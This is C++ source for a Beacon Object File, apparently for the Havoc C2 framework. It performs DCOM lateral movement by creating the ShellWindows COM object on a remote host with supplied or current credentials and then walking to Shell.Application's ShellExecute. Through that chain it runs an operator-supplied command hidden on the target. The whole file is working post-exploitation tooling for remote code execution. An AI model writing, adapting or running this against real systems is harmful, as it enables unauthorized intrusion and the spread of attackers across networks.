/*
 * DCOM Lateral Movement BOF — IShellWindows chain + IShellDispatch2.ShellExecute
 *
 * Target: a user is interactively logged on to the remote host (Explorer running).
 *
 * COM chain:
 *   CoCreateInstanceEx(CLSID_ShellWindows, remote)
 *     -> IShellWindows::FindWindowSW(SWC_DESKTOP, SWFO_NEEDDISPATCH) -> IDispatch
 *       -> IServiceProvider::QueryService(SID_STopLevelBrowser) -> IShellBrowser
 *         -> IShellBrowser::QueryActiveShellView -> IShellView
 *           -> IShellView::GetItemObject(SVGIO_BACKGROUND, IID_IDispatch) -> IDispatch
 *             -> QI IShellFolderViewDual
 *               -> get_Application -> IDispatch
 *                 -> QI IShellDispatch2
 *                   -> ShellExecute(file, args, dir, verb, show)
 *
 * Wire format (packed by dcom.py):
 *   wstr target
 *   wstr domain
 *   wstr username
 *   wstr password
 *   wstr command         (full command line; split on first space for exe/args)
 *   bool is_current      (1 = use Demon's current token, 0 = use supplied creds)
 */

#include <windows.h>
#include <objbase.h>
#include <servprov.h>
#include <exdisp.h>
#include <shldisp.h>
#include <shlobj.h>
#include <stdint.h>

extern "C" {
#include "beacon.h"

void go(char* buff, int len);

/* --- OLE32 --- */
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeEx(LPVOID pvReserved, DWORD dwCoInit);
DECLSPEC_IMPORT void    WINAPI OLE32$CoUninitialize(void);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstanceEx(REFCLSID rclsid, IUnknown* punkOuter, DWORD dwClsCtx, COSERVERINFO* pServerInfo, DWORD dwCount, MULTI_QI* pResults);

/* --- OLEAUT32 --- */
DECLSPEC_IMPORT BSTR    WINAPI OLEAUT32$SysAllocString(const OLECHAR* psz);
DECLSPEC_IMPORT void    WINAPI OLEAUT32$SysFreeString(BSTR bstr);
DECLSPEC_IMPORT void    WINAPI OLEAUT32$VariantInit(VARIANTARG* pvarg);
DECLSPEC_IMPORT HRESULT WINAPI OLEAUT32$VariantClear(VARIANTARG* pvarg);

/* --- KERNEL32 / MSVCRT --- */
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
DECLSPEC_IMPORT size_t  __cdecl MSVCRT$wcslen(const wchar_t* s);
DECLSPEC_IMPORT wchar_t* __cdecl MSVCRT$wcschr(const wchar_t* s, wchar_t c);
DECLSPEC_IMPORT void*   __cdecl MSVCRT$memcpy(void* dst, const void* src, size_t n);

}

/* Local GUID constants (BOFs can't link libuuid) */
static const CLSID BOF_CLSID_ShellWindows        = { 0x9BA05972, 0xF6A8, 0x11CF, { 0xA4, 0x42, 0x00, 0xA0, 0xC9, 0x0A, 0x8F, 0x39 } };
static const IID   BOF_IID_IShellWindows         = { 0x85CB6900, 0x4D95, 0x11CF, { 0x96, 0x0C, 0x00, 0x80, 0xC7, 0xF4, 0xEE, 0x85 } };
static const IID   BOF_IID_IServiceProvider      = { 0x6D5140C1, 0x7436, 0x11CE, { 0x80, 0x34, 0x00, 0xAA, 0x00, 0x60, 0x09, 0xFA } };
static const GUID  BOF_SID_STopLevelBrowser      = { 0x4C96BE40, 0x915C, 0x11CF, { 0x99, 0xD3, 0x00, 0xAA, 0x00, 0x4A, 0xE8, 0x37 } };
static const IID   BOF_IID_IShellBrowser         = { 0x000214E2, 0x0000, 0x0000, { 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 } };
static const IID   BOF_IID_IDispatch             = { 0x00020400, 0x0000, 0x0000, { 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 } };
static const IID   BOF_IID_NULL                  = { 0x00000000, 0x0000, 0x0000, { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 } };
static const IID   BOF_IID_IShellFolderViewDual  = { 0xE7A1AF80, 0x4D96, 0x11CF, { 0x96, 0x0C, 0x00, 0x80, 0xC7, 0xF4, 0xEE, 0x85 } };
static const IID   BOF_IID_IShellDispatch2       = { 0xA4C6892C, 0x3BA9, 0x11D2, { 0x9D, 0xEA, 0x00, 0xC0, 0x4F, 0xB1, 0x62, 0xD8 } };

static inline void SafeRelease(IUnknown* p)
{
    if (p) p->Release();
}

static void SplitCommand(const wchar_t* full, BSTR* outExe, BSTR* outArgs)
{
    *outExe  = NULL;
    *outArgs = NULL;
    if (!full) return;

    wchar_t* space = MSVCRT$wcschr(full, L' ');
    if (!space) {
        *outExe = OLEAUT32$SysAllocString(full);
        return;
    }
    size_t exeLen = (size_t)(space - full);
    size_t bytes  = (exeLen + 1) * sizeof(wchar_t);
    wchar_t* tmp  = (wchar_t*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, bytes);
    if (tmp) {
        MSVCRT$memcpy(tmp, full, exeLen * sizeof(wchar_t));
        tmp[exeLen] = 0;
        *outExe = OLEAUT32$SysAllocString(tmp);
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, tmp);
    }
    *outArgs = OLEAUT32$SysAllocString(space + 1);
}

void go(char* buff, int len)
{
    HRESULT hr = S_OK;
    BOOL comInited = FALSE;
    datap parser;
    wchar_t* target   = NULL;
    wchar_t* domain   = NULL;
    wchar_t* username = NULL;
    wchar_t* password = NULL;
    wchar_t* command  = NULL;
    int      isCurrent = 1;
    COSERVERINFO si;
    COAUTHINFO ai;
    COAUTHIDENTITY authId;
    MULTI_QI mqi;
    IShellWindows*         psw         = NULL;
    IDispatch*             pdisp       = NULL;
    IServiceProvider*      psp         = NULL;
    IShellBrowser*         psb         = NULL;
    IShellView*            psv         = NULL;
    IDispatch*             pdispBg     = NULL;
    IShellFolderViewDual*  psfvd       = NULL;
    IDispatch*             papp        = NULL;
    BSTR bExe  = NULL;
    BSTR bArgs = NULL;
    VARIANT vEmpty, vLoc, vDir, vOp, vShow, vArgs;

    BeaconDataParse(&parser, buff, len);
    target    = (wchar_t*)BeaconDataExtract(&parser, NULL);
    domain    = (wchar_t*)BeaconDataExtract(&parser, NULL);
    username  = (wchar_t*)BeaconDataExtract(&parser, NULL);
    password  = (wchar_t*)BeaconDataExtract(&parser, NULL);
    command   = (wchar_t*)BeaconDataExtract(&parser, NULL);
    isCurrent = BeaconDataInt(&parser);

    if (!target || !command || !MSVCRT$wcslen(target) || !MSVCRT$wcslen(command)) {
        BeaconPrintf(CALLBACK_ERROR, "DCOM: missing target or command");
        return;
    }

    hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (SUCCEEDED(hr) || hr == S_FALSE) {
        comInited = TRUE;
    } else if (hr == RPC_E_CHANGED_MODE) {
        comInited = FALSE;
    } else {
        BeaconPrintf(CALLBACK_ERROR, "DCOM: CoInitializeEx failed 0x%08lx", hr);
        return;
    }

    SecureZeroMemory(&si,     sizeof(si));
    SecureZeroMemory(&ai,     sizeof(ai));
    SecureZeroMemory(&authId, sizeof(authId));
    si.pwszName  = target;
    si.pAuthInfo = NULL;

    if (!isCurrent && username && MSVCRT$wcslen(username) > 0) {
        authId.User           = (USHORT*)username;
        authId.UserLength     = (ULONG)MSVCRT$wcslen(username);
        authId.Password       = (USHORT*)(password ? password : L"");
        authId.PasswordLength = (ULONG)(password ? MSVCRT$wcslen(password) : 0);
        authId.Domain         = (USHORT*)(domain ? domain : L"");
        authId.DomainLength   = (ULONG)(domain ? MSVCRT$wcslen(domain) : 0);
        authId.Flags          = SEC_WINNT_AUTH_IDENTITY_UNICODE;

        ai.dwAuthnSvc           = RPC_C_AUTHN_WINNT;
        ai.dwAuthzSvc           = RPC_C_AUTHZ_NONE;
        ai.pwszServerPrincName  = NULL;
        ai.dwAuthnLevel         = RPC_C_AUTHN_LEVEL_PKT_PRIVACY;
        ai.dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
        ai.pAuthIdentityData    = &authId;
        ai.dwCapabilities       = EOAC_NONE;
        si.pAuthInfo            = &ai;
    }

    SecureZeroMemory(&mqi, sizeof(mqi));
    mqi.pIID = &BOF_IID_IShellWindows;
    mqi.pItf = NULL;
    mqi.hr   = 0;

    hr = OLE32$CoCreateInstanceEx(BOF_CLSID_ShellWindows, NULL, CLSCTX_REMOTE_SERVER, &si, 1, &mqi);
    if (FAILED(hr) || FAILED(mqi.hr) || !mqi.pItf) {
        BeaconPrintf(CALLBACK_ERROR, "DCOM: CoCreateInstanceEx failed 0x%08lx (mqi=0x%08lx)", hr, mqi.hr);
        goto cleanup;
    }
    psw = (IShellWindows*)mqi.pItf;

    /* Find the Explorer desktop window */
    {
        OLEAUT32$VariantInit(&vEmpty);
        OLEAUT32$VariantInit(&vLoc);
        vEmpty.vt = VT_EMPTY;
        vLoc.vt   = VT_EMPTY;
        long hwnd = 0;
        hr = psw->FindWindowSW(&vEmpty, &vLoc, SWC_DESKTOP, &hwnd, SWFO_NEEDDISPATCH, &pdisp);
        OLEAUT32$VariantClear(&vEmpty);
        OLEAUT32$VariantClear(&vLoc);
        if (FAILED(hr) || !pdisp) {
            BeaconPrintf(CALLBACK_ERROR, "DCOM: FindWindowSW failed 0x%08lx (no interactive user?)", hr);
            goto cleanup;
        }
    }

    hr = pdisp->QueryInterface(BOF_IID_IServiceProvider, (void**)&psp);
    if (FAILED(hr) || !psp) {
        BeaconPrintf(CALLBACK_ERROR, "DCOM: QI IServiceProvider failed 0x%08lx", hr);
        goto cleanup;
    }

    hr = psp->QueryService(BOF_SID_STopLevelBrowser, BOF_IID_IShellBrowser, (void**)&psb);
    if (FAILED(hr) || !psb) {
        BeaconPrintf(CALLBACK_ERROR, "DCOM: QueryService IShellBrowser failed 0x%08lx", hr);
        goto cleanup;
    }

    hr = psb->QueryActiveShellView(&psv);
    if (FAILED(hr) || !psv) {
        BeaconPrintf(CALLBACK_ERROR, "DCOM: QueryActiveShellView failed 0x%08lx", hr);
        goto cleanup;
    }

    hr = psv->GetItemObject(SVGIO_BACKGROUND, BOF_IID_IDispatch, (void**)&pdispBg);
    if (FAILED(hr) || !pdispBg) {
        BeaconPrintf(CALLBACK_ERROR, "DCOM: GetItemObject failed 0x%08lx", hr);
        goto cleanup;
    }

    hr = pdispBg->QueryInterface(BOF_IID_IShellFolderViewDual, (void**)&psfvd);
    if (FAILED(hr) || !psfvd) {
        BeaconPrintf(CALLBACK_ERROR, "DCOM: QI IShellFolderViewDual failed 0x%08lx", hr);
        goto cleanup;
    }

    hr = psfvd->get_Application(&papp);
    if (FAILED(hr) || !papp) {
        BeaconPrintf(CALLBACK_ERROR, "DCOM: get_Application failed 0x%08lx", hr);
        goto cleanup;
    }

    /* Call Shell.Application.ShellExecute via IDispatch::Invoke.
     * This dodges a QI for IShellDispatch2 that fails with E_NOINTERFACE on
     * some marshalled remote dispatches. */
    SplitCommand(command, &bExe, &bArgs);
    if (!bExe) {
        BeaconPrintf(CALLBACK_ERROR, "DCOM: failed to allocate exe BSTR");
        goto cleanup;
    }

    {
        DISPID dispidExec = 0;
        OLECHAR* name = (OLECHAR*)L"ShellExecute";
        hr = papp->GetIDsOfNames(BOF_IID_NULL, &name, 1, LOCALE_USER_DEFAULT, &dispidExec);
        if (FAILED(hr)) {
            BeaconPrintf(CALLBACK_ERROR, "DCOM: GetIDsOfNames(ShellExecute) failed 0x%08lx", hr);
            goto cleanup;
        }

        /* Shell.Application.ShellExecute(File, Args, Dir, Verb, Show)
         * DISPPARAMS args in REVERSE order. */
        VARIANT vFile;
        OLEAUT32$VariantInit(&vFile);
        OLEAUT32$VariantInit(&vArgs);
        OLEAUT32$VariantInit(&vDir);
        OLEAUT32$VariantInit(&vOp);
        OLEAUT32$VariantInit(&vShow);

        vFile.vt     = VT_BSTR;
        vFile.bstrVal = bExe;
        vArgs.vt     = VT_BSTR;
        vArgs.bstrVal = bArgs ? bArgs : OLEAUT32$SysAllocString(L"");
        vDir.vt      = VT_BSTR;
        vDir.bstrVal = OLEAUT32$SysAllocString(L"C:\\Windows\\System32");
        vOp.vt       = VT_BSTR;
        vOp.bstrVal  = OLEAUT32$SysAllocString(L"open");
        vShow.vt     = VT_INT;
        vShow.intVal = 0;

        VARIANT vargs[5];
        vargs[0] = vShow; /* reversed */
        vargs[1] = vOp;
        vargs[2] = vDir;
        vargs[3] = vArgs;
        vargs[4] = vFile;

        DISPPARAMS dp;
        dp.cArgs             = 5;
        dp.cNamedArgs        = 0;
        dp.rgvarg            = vargs;
        dp.rgdispidNamedArgs = NULL;

        EXCEPINFO ei;
        SecureZeroMemory(&ei, sizeof(ei));
        UINT argErr = 0;
        hr = papp->Invoke(dispidExec, BOF_IID_NULL, LOCALE_USER_DEFAULT,
                          DISPATCH_METHOD, &dp, NULL, &ei, &argErr);

        /* Free strings we allocated here (vFile.bstrVal == bExe, cleaned up
         * below; vArgs.bstrVal may be bArgs, same cleanup). */
        if (vDir.bstrVal)  OLEAUT32$SysFreeString(vDir.bstrVal);
        if (vOp.bstrVal)   OLEAUT32$SysFreeString(vOp.bstrVal);
        if (!bArgs && vArgs.bstrVal) OLEAUT32$SysFreeString(vArgs.bstrVal);

        if (FAILED(hr)) {
            BeaconPrintf(CALLBACK_ERROR, "DCOM: ShellExecute Invoke failed 0x%08lx (argErr=%u)", hr, argErr);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "DCOM: dispatched to %ls -> %ls", target, command);
        }
    }

cleanup:
    if (bExe)  OLEAUT32$SysFreeString(bExe);
    if (bArgs) OLEAUT32$SysFreeString(bArgs);
    SafeRelease(papp);
    SafeRelease(psfvd);
    SafeRelease(pdispBg);
    SafeRelease(psv);
    SafeRelease(psb);
    SafeRelease(psp);
    SafeRelease(pdisp);
    SafeRelease(psw);
    if (comInited) OLE32$CoUninitialize();
}
